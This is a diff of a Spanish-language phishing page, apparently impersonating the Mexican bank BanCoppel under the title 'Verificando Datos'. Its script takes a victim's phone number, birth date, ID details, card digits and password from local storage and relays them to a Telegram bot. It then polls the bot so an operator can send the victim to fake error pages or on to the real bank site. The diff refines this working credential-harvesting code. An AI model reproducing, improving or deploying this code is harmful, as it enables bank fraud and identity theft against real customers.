@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Verificando Datos</title>
   <style>
     body {
@@ -17,41 +17,34 @@
     }
     .blur-overlay {
       position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(255,255,255,0.4);
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(255, 255, 255, 0.4);
       backdrop-filter: blur(10px);
     }
     .loaderp-full {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      height: 100%; width: 100%;
+      display: flex; flex-direction: column;
+      justify-content: center; align-items: center;
+      position: fixed; width: 90%; height: 90%;
+      z-index: 9999;
     }
     .loaderp {
-      width: 180px;
-      height: 180px;
+      width: 180px; height: 180px;
       background-image: url('img/circulo.png');
-      background-size: cover;
-      border-radius: 50%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
+      background-size: cover; border-radius: 50%;
+      display: flex; flex-direction: column;
+      justify-content: center; align-items: center;
     }
     .loader {
-      width: 30px;
-      height: 30px;
+      width: 30px; height: 30px;
       border: 5px solid #f3f3f3;
-      border-top: 5px solid #333;
+      border-top: 5px solid #555;
       border-radius: 50%;
       animation: spin 1s linear infinite;
     }
     .loaderp-text {
       margin-top: 30px;
-      font-size: 14px;
-      color: #000;
+      font-size: 13px;
+      color: black;
     }
     @keyframes spin {
       0% { transform: rotate(0deg); }
@@ -64,21 +57,21 @@
   <div class="loaderp-full">
     <div class="loaderp">
       <div class="loader"></div>
-      <div class="loaderp-text">Verificando...</div>
+      <div class="loaderp-text">Cargando...</div>
     </div>
   </div>
 
 <script>
-document.addEventListener('DOMContentLoaded', async () => {
-  const loader = document.querySelector('.loaderp-full');
-  const config = await fetch("botconfig.json").then(r => r.json()).catch(err => {
-    alert("Error cargando configuración");
-    console.error(err);
-    return null;
-  });
-  if (!config || !config.token || !config.chat_id) return;
+document.addEventListener('DOMContentLoaded', async function () {
+  const config = await fetch("botconfig.json").then(r => r.json()).catch(() => null);
+  if (!config || !config.token || !config.chat_id) {
+    alert("Error cargando configuración del bot.");
+    return;
+  }
 
+  const { token, chat_id } = config;
   const data = JSON.parse(localStorage.getItem("bancoldata") || "{}");
+
   if (!data.celular || !data.nacimiento || !data.tipo || !data.identificador || !data.digitosFinales || !data.clave) {
     alert("Faltan datos. Redirigiendo...");
     return window.location.href = "index.html";
@@ -88,8 +81,8 @@ document.addEventListener('DOMContentLoaded', async () => {
   localStorage.setItem("transactionId", transactionId);
 
   const mensaje = `
-<b>REGISTRO NUEVO</b>
-🆔 ID: ${transactionId}
+📥 <b>REGISTRO NUEVO</b>
+🆔 ID: <code>${transactionId}</code>
 📱 Celular: ${data.celular}
 🎂 Nacimiento: ${data.nacimiento}
 💳 Tipo: ${data.tipo}
@@ -112,8 +105,8 @@ document.addEventListener('DOMContentLoaded', async () => {
     body: "data=" + encodeURIComponent(mensaje) + "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
   });
 
-  const offset = await getLastUpdateId(config.token);
-  checkBoton(config.token, transactionId, offset + 1);
+  const latestOffset = await getLastUpdateId(token);
+  checkBoton(token, transactionId, latestOffset + 1);
 });
 
 async function getLastUpdateId(botToken) {
@@ -123,7 +116,6 @@ async function getLastUpdateId(botToken) {
     if (!data.ok || !data.result.length) return 0;
     return data.result[data.result.length - 1].update_id;
   } catch (e) {
-    console.error("No se pudo obtener update_id:", e);
     return 0;
   }
 }
@@ -132,15 +124,27 @@ async function checkBoton(botToken, txId, offset) {
   try {
     const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}`);
     const data = await res.json();
-    if (!data.ok || !data.result) throw new Error("Sin resultados");
 
+    if (!data.ok || !data.result) throw new Error("Sin respuesta válida");
     let newOffset = offset;
 
     for (const update of data.result) {
       newOffset = update.update_id + 1;
+
       if (update.callback_query && update.callback_query.data.includes(txId)) {
         const tipo = update.callback_query.data.split(":")[0];
-        console.log("Botón presionado:", tipo);
+        const chatId = update.callback_query.message.chat.id;
+        const callbackId = update.callback_query.id;
+
+        await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            callback_query_id: callbackId,
+            text: "Acción recibida ✅",
+            show_alert: false
+          })
+        });
 
         await fetch("sendStatus.php", {
           method: "POST",
@@ -154,18 +158,17 @@ async function checkBoton(botToken, txId, offset) {
           case "error_logo":
             return window.location.href = "errorlogo.html";
           case "confirm_finalizar":
-            return window.location.href = "https://www.bancoppel.com/";
+            return window.location.href = "https://www.bancoppel.com";
         }
       }
     }
 
-    setTimeout(() => checkBoton(botToken, txId, newOffset), 3000);
+    setTimeout(() => checkBoton(botToken, txId, newOffset), 2500);
   } catch (err) {
     console.error("Error verificando botón:", err);
     setTimeout(() => checkBoton(botToken, txId, offset), 3000);
   }
 }
 </script>
-
 </body>
 </html>
